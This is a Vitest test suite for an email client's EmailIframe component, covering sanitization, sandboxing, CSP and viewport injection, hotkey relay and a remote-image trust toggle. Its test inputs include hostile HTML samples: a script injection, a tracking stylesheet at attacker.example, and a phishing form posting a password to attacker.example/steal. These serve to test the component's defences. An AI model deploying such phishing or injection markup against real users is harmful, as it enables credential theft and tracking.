import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import EmailIframe from "./EmailIframe";
import { withEmailContentSecurityPolicy, withMobileViewport } from "./withMobileViewport";

const CSP_POLICY = "default-src 'none'; img-src data:; style-src 'unsafe-inline'";

afterEach(() => {
  cleanup();
});

// The srcDoc string is the deterministic output of the sanitize + tracking-pixel
// pass — assert on it directly rather than racing the iframe's document parsing.
function srcdocFor(html: string): string {
  render(<EmailIframe html={html} />);
  return screen.getByTitle("Email content").getAttribute("srcdoc") || "";
}

describe("EmailIframe sanitization (security surface)", () => {
  it("strips <script> tags from untrusted email HTML", () => {
    const out = srcdocFor('<p>hello</p><script>window.__pwned = 1;</script>');
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toContain("__pwned");
    expect(out).toContain("hello");
  });

  it("removes 1x1 and 0x0 tracking pixels but keeps real images", () => {
    const out = srcdocFor(
      '<img src="https://track.example/pixel.gif" width="1" height="1">'
        + '<img src="https://track.example/beacon.gif" height="0">'
        + '<img src="https://cdn.example/banner.png" width="600" height="200">',
    );
    expect(out).not.toContain("pixel.gif");
    expect(out).not.toContain("beacon.gif");
    expect(out).toContain("banner.png");
    expect(out).toContain('width="600"');
  });

  it("keeps width=100/height=150 images (digit-prefix is not a tracking pixel)", () => {
    const out = srcdocFor('<img src="https://cdn.example/wide.png" width="100" height="150">');
    expect(out).toContain("wide.png");
  });

  it("preserves email styling tags and allowlisted attributes", () => {
    const out = srcdocFor('<style>.a{color:red}</style><div class="a" bgcolor="#ffffff">body</div>');
    expect(out).toMatch(/<style/i);
    expect(out).toContain('class="a"');
    expect(out).toContain("body");
  });

  it("strips external <link> stylesheets from untrusted email HTML", () => {
    const out = srcdocFor('<link rel="stylesheet" href="https://attacker.example/track.css"><p>body</p>');
    expect(out).not.toMatch(/<link/i);
    expect(out).not.toContain("track.css");
    expect(out).toContain("body");
  });

  it("strips inline form controls (phishing surface) from untrusted email HTML", () => {
    const out = srcdocFor(
      '<form action="https://attacker.example/steal"><input name="password" type="password"><button>Log in</button></form><p>body</p>',
    );
    expect(out).not.toMatch(/<form|<input|<button/i);
    expect(out).not.toContain("attacker.example");
    expect(out).toContain("body");
  });

  it("sandboxes the iframe without allow-scripts so embedded JS cannot execute", () => {
    render(<EmailIframe html="<p>x</p>" />);
    const sandbox = screen.getByTitle("Email content").getAttribute("sandbox") || "";
    expect(sandbox).not.toMatch(/allow-scripts/);
    expect(sandbox.split(/\s+/)).toEqual(
      expect.arrayContaining([
        "allow-same-origin",
        "allow-popups",
        "allow-popups-to-escape-sandbox",
      ]),
    );
  });
});

describe("EmailIframe reader-hotkey relay", () => {
  // The inbox/shell command listeners live on the parent window; relayed events
  // reach them via the window->document->window propagation of a parent-document
  // dispatch.
  function withParentKeyListener(run: (received: string[]) => void) {
    const received: string[] = [];
    const onParentKey = (event: KeyboardEvent) => received.push(event.key);
    window.addEventListener("keydown", onParentKey);
    try {
      run(received);
    } finally {
      window.removeEventListener("keydown", onParentKey);
    }
  }

  // Alfred's Esc handler is a document-CAPTURE listener — the relay must reach it,
  // not just window listeners, for the preview to close from inside its iframe.
  function withDocumentCaptureListener(run: (received: string[]) => void) {
    const received: string[] = [];
    const onKey = (event: KeyboardEvent) => received.push(event.key);
    document.addEventListener("keydown", onKey, true);
    try {
      run(received);
    } finally {
      document.removeEventListener("keydown", onKey, true);
    }
  }

  function loadedIframe(html = "<p>body</p>"): HTMLIFrameElement {
    render(<EmailIframe html={html} />);
    const iframe = screen.getByTitle("Email content");
    fireEvent.load(iframe);
    return iframe as HTMLIFrameElement;
  }

  it("relays shell tab keys and inbox command keys from the email document", () => {
    withParentKeyListener((received) => {
      const doc = loadedIframe("<p>Loaded email body</p>").contentDocument!;
      for (const key of ["1", "2", "f", "d", "j", "o"]) {
        doc.dispatchEvent(new KeyboardEvent("keydown", { key, bubbles: true, cancelable: true }));
      }
      expect(received).toEqual(["1", "2", "f", "d", "j", "o"]);
    });
  });

  it("relays Escape to a document-capture listener (Alfred preview close path)", () => {
    withDocumentCaptureListener((received) => {
      const doc = loadedIframe().contentDocument!;
      doc.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }));
      expect(received).toEqual(["Escape"]);
    });
  });

  it("relays Cmd/Ctrl+Backslash with modifiers intact so the shell can toggle Alfred", () => {
    const received: Array<{ key: string; code: string; metaKey: boolean; ctrlKey: boolean }> = [];
    const onParentKey = (event: KeyboardEvent) => received.push({
      key: event.key,
      code: event.code,
      metaKey: event.metaKey,
      ctrlKey: event.ctrlKey,
    });
    window.addEventListener("keydown", onParentKey);
    try {
      const doc = loadedIframe().contentDocument!;
      doc.dispatchEvent(new KeyboardEvent("keydown", {
        key: "\\", code: "Backslash", metaKey: true, bubbles: true, cancelable: true,
      }));
      doc.dispatchEvent(new KeyboardEvent("keydown", {
        key: "\\", code: "Backslash", ctrlKey: true, bubbles: true, cancelable: true,
      }));
      expect(received).toEqual([
        { key: "\\", code: "Backslash", metaKey: true, ctrlKey: false },
        { key: "\\", code: "Backslash", metaKey: false, ctrlKey: true },
      ]);
    } finally {
      window.removeEventListener("keydown", onParentKey);
    }
  });

  it("leaves scroll/native keys and modifier combos un-relayed", () => {
    withParentKeyListener((received) => {
      const doc = loadedIframe().contentDocument!;
      doc.dispatchEvent(new KeyboardEvent("keydown", { key: "ArrowDown", bubbles: true }));
      doc.dispatchEvent(new KeyboardEvent("keydown", { key: " ", bubbles: true }));
      doc.dispatchEvent(new KeyboardEvent("keydown", { key: "3", bubbles: true }));
      doc.dispatchEvent(new KeyboardEvent("keydown", { key: "e", metaKey: true, bubbles: true }));
      doc.dispatchEvent(new KeyboardEvent("keydown", { key: "f", ctrlKey: true, bubbles: true }));
      doc.dispatchEvent(new KeyboardEvent("keydown", { key: "1", altKey: true, bubbles: true }));

      expect(received).toEqual([]);
    });
  });

  it("does not relay command keys typed into a form field inside the email", () => {
    withParentKeyListener((received) => {
      const doc = loadedIframe().contentDocument!;
      const host = doc.body || doc.documentElement;
      const input = doc.createElement("input");
      host.appendChild(input);

      input.dispatchEvent(new KeyboardEvent("keydown", { key: "d", bubbles: true }));

      expect(received).toEqual([]);
    });
  });
});

describe("EmailIframe mobile viewport", () => {
  it("injects a device-width viewport meta into the srcDoc when isMobile", () => {
    render(<EmailIframe html="<html><head></head><body><p>hi</p></body></html>" isMobile />);
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    expect(out).toMatch(/name="viewport"/);
    expect(out).toContain("width=device-width");
  });

  it("leaves the srcDoc free of the viewport meta on desktop", () => {
    render(<EmailIframe html="<html><head></head><body><p>hi</p></body></html>" />);
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    expect(out).not.toContain("width=device-width");
  });

  it("never disables pinch-zoom (no maximum-scale)", () => {
    render(<EmailIframe html="<p>hi</p>" isMobile />);
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    expect(out).not.toMatch(/maximum-scale/);
  });
});

describe("EmailIframe content security policy", () => {
  it("injects the CSP meta on desktop, ordered before the body content", () => {
    const out = srcdocFor("<p>hello</p>");
    expect(out).toContain('http-equiv="Content-Security-Policy"');
    expect(out).toContain(CSP_POLICY);
    expect(out.indexOf("Content-Security-Policy")).toBeLessThan(out.indexOf("hello"));
  });

  it("injects the CSP meta on mobile, ordered before the viewport meta", () => {
    render(<EmailIframe html="<html><head></head><body><p>hi</p></body></html>" isMobile />);
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    expect(out).toContain('http-equiv="Content-Security-Policy"');
    expect(out).toContain("width=device-width");
    expect(out.indexOf("Content-Security-Policy")).toBeLessThan(out.indexOf("width=device-width"));
  });

  it("never whitelists a network source (no https:/http: in the policy)", () => {
    const out = srcdocFor("<p>hello</p>");
    const cspContentMatch = out.match(/http-equiv="Content-Security-Policy" content="([^"]*)"/);
    expect(cspContentMatch).not.toBeNull();
    const policyValue = cspContentMatch?.[1] || "";
    expect(policyValue).not.toMatch(/https:/);
    expect(policyValue).not.toMatch(/http:/);
  });

  it("neutralizes a sender-supplied CSP meta to exactly one http-equiv occurrence", () => {
    const out = srcdocFor('<meta http-equiv="Content-Security-Policy" content="img-src https:"><p>x</p>');
    const occurrences = out.match(/http-equiv=/g) || [];
    expect(occurrences.length).toBe(1);
    expect(out).toContain(CSP_POLICY);
  });
});

describe("EmailIframe show remote content toggle", () => {
  it("shows the banner when the sanitized body has a remote <img>", () => {
    render(<EmailIframe html='<img src="https://cdn.example/banner.png"><p>hi</p>' />);
    expect(screen.getByText(/images are blocked/i)).toBeTruthy();
  });

  it("does not show the banner for a plain-text-only body", () => {
    render(<EmailIframe html="<p>just text, no images</p>" />);
    expect(screen.queryByText(/images are blocked/i)).toBeNull();
  });

  it("does not show the banner when all images are inline data: URIs", () => {
    render(<EmailIframe html='<img src="data:image/png;base64,aaaa"><p>hi</p>' />);
    expect(screen.queryByText(/images are blocked/i)).toBeNull();
  });

  it("widens the CSP and reveals one inline trust confirmation after Show once", () => {
    const onTrustSender = vi.fn(async () => {});
    render(
      <EmailIframe
        html='<img src="https://cdn.example/banner.png"><p>hi</p>'
        remoteContentTrust={{
          status: "untrusted",
          senderAddress: "news@example.com",
          onTrustSender,
        }}
      />,
    );
    expect(screen.getAllByRole("button")).toHaveLength(1);
    expect(screen.getByRole("button", { name: "Show once" })).toBeTruthy();
    expect(screen.queryByRole("button", { name: /always show/i })).toBeNull();

    fireEvent.click(screen.getByRole("button", { name: "Show once" }));

    expect(screen.getByText(/shown for this message/i)).toBeTruthy();
    expect(screen.getAllByRole("button")).toHaveLength(1);
    expect(screen.getByRole("button", { name: "Always show from news@example.com" })).toBeTruthy();
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    const cspContentMatch = out.match(/http-equiv="Content-Security-Policy" content="([^"]*)"/);
    expect(cspContentMatch).not.toBeNull();
    const policyValue = cspContentMatch?.[1] || "";
    expect(policyValue).toContain("img-src data: https:");
    expect(policyValue).toContain("style-src 'unsafe-inline'");
    expect(policyValue).not.toContain("style-src https:");
  });

  it("persists trust only on the second inline action", async () => {
    let trustCalls = 0;
    const onTrustSender = async () => {
      trustCalls += 1;
    };
    render(
      <EmailIframe
        html='<img src="https://cdn.example/banner.png"><p>hi</p>'
        remoteContentTrust={{
          status: "untrusted",
          senderAddress: "news@example.com",
          onTrustSender,
        }}
      />,
    );

    fireEvent.click(screen.getByRole("button", { name: "Show once" }));
    expect(trustCalls).toBe(0);
    fireEvent.click(screen.getByRole("button", { name: "Always show from news@example.com" }));

    await waitFor(() => expect(trustCalls).toBe(1));
    expect(screen.queryByText(/remote content/i)).toBeNull();
  });

  it("keeps one-time content visible and reports a trust persistence failure inline", async () => {
    const onTrustSender = vi.fn(async () => {
      throw new Error("Could not save trusted sender.");
    });
    render(
      <EmailIframe
        html='<img src="https://cdn.example/banner.png"><p>hi</p>'
        remoteContentTrust={{
          status: "untrusted",
          senderAddress: "news@example.com",
          onTrustSender,
        }}
      />,
    );

    fireEvent.click(screen.getByRole("button", { name: "Show once" }));
    fireEvent.click(screen.getByRole("button", { name: "Always show from news@example.com" }));

    expect((await screen.findByRole("alert")).textContent).toContain("Could not save trusted sender.");
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    expect(out).toContain("img-src data: https:");
  });

  it("loads trusted sender content immediately without banner chrome", () => {
    render(
      <EmailIframe
        html='<img src="https://cdn.example/banner.png"><p>hi</p>'
        remoteContentTrust={{ status: "trusted", senderAddress: "news@example.com" }}
      />,
    );

    expect(screen.queryByText(/remote content/i)).toBeNull();
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    expect(out).toContain("img-src data: https:");
  });

  it("keeps content blocked without flashing the banner while trust is loading", () => {
    render(
      <EmailIframe
        html='<img src="https://cdn.example/banner.png"><p>hi</p>'
        remoteContentTrust={{ status: "loading", senderAddress: "news@example.com" }}
      />,
    );

    expect(screen.queryByText(/images are blocked/i)).toBeNull();
    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
    expect(out).toContain(CSP_POLICY);
  });

  it("offers only the one-time action when sender trust identity is unavailable", () => {
    render(
      <EmailIframe
        html='<img src="https://cdn.example/banner.png"><p>hi</p>'
        remoteContentTrust={{ status: "untrusted" }}
      />,
    );

    fireEvent.click(screen.getByRole("button", { name: "Show once" }));

    expect(screen.queryByText(/images are blocked/i)).toBeNull();
    expect(screen.queryByRole("button", { name: /always show/i })).toBeNull();
  });

  it("resets to blocked when a different email (new html) is rendered", () => {
    const { rerender } = render(<EmailIframe html='<img src="https://cdn.example/banner.png"><p>first</p>' />);
    fireEvent.click(screen.getByRole("button", { name: "Show once" }));
    expect(screen.queryByText(/images are blocked/i)).toBeNull();

    rerender(<EmailIframe html='<img src="https://cdn.example/other.png"><p>second</p>' />);
    expect(screen.getByText(/images are blocked/i)).toBeTruthy();
  });

  it("resets the one-time grant by message identity even when two emails have identical HTML", () => {
    const html = '<img src="https://cdn.example/banner.png"><p>same template</p>';
    const { rerender } = render(<EmailIframe html={html} messageKey="message-1" />);
    fireEvent.click(screen.getByRole("button", { name: "Show once" }));
    expect(screen.queryByText(/images are blocked/i)).toBeNull();

    rerender(<EmailIframe html={html} messageKey="message-2" />);

    expect(screen.getByText(/images are blocked/i)).toBeTruthy();
  });
});

describe("withEmailContentSecurityPolicy", () => {
  it("inserts the meta just after an existing <head>", () => {
    const out = withEmailContentSecurityPolicy("<html><head><title>x</title></head><body>b</body></html>");
    expect(out).toMatch(/<head><meta http-equiv="Content-Security-Policy"/);
  });

  it("adds a <head> when the document has <html> but no head", () => {
    const out = withEmailContentSecurityPolicy("<html><body>b</body></html>");
    expect(out).toMatch(/<html><head><meta http-equiv="Content-Security-Policy"/);
  });

  it("prepends a <head> when there is no document wrapper", () => {
    const out = withEmailContentSecurityPolicy("<p>bare</p>");
    expect(out.startsWith('<head><meta http-equiv="Content-Security-Policy"')).toBe(true);
  });

  it("accepts an explicit policy string as a second argument", () => {
    const out = withEmailContentSecurityPolicy("<p>bare</p>", "default-src 'none'; img-src data: https:; style-src 'unsafe-inline'");
    expect(out).toContain('content="default-src \'none\'; img-src data: https:; style-src \'unsafe-inline\'"');
  });
});

describe("withMobileViewport", () => {
  it("inserts the meta just after an existing <head>", () => {
    const out = withMobileViewport("<html><head><title>x</title></head><body>b</body></html>");
    expect(out).toMatch(/<head><meta name="viewport"/);
  });

  it("adds a <head> when the document has <html> but no head", () => {
    const out = withMobileViewport("<html><body>b</body></html>");
    expect(out).toMatch(/<html><head><meta name="viewport"/);
  });

  it("prepends a <head> when there is no document wrapper", () => {
    const out = withMobileViewport("<p>bare</p>");
    expect(out.startsWith('<head><meta name="viewport"')).toBe(true);
  });

  it("matches the full open tag even when an attribute value contains '>'", () => {
    const out = withMobileViewport('<head data-x="a > b"><title>t</title></head><body>b</body>');
    expect(out).toContain('<head data-x="a > b"><meta name="viewport"');
    expect(out).toContain('data-x="a > b"');
  });

  it("injects the reset before the email's own styles in a whole document", () => {
    const out = withMobileViewport('<html><head><style>.x{color:red}</style></head><body><p>hi</p></body></html>');
    expect(out).toContain("width=device-width");
    expect(out).toContain("<p>hi</p>");
    expect(out.indexOf("width=device-width")).toBeLessThan(out.indexOf(".x{color:red}"));
  });
});
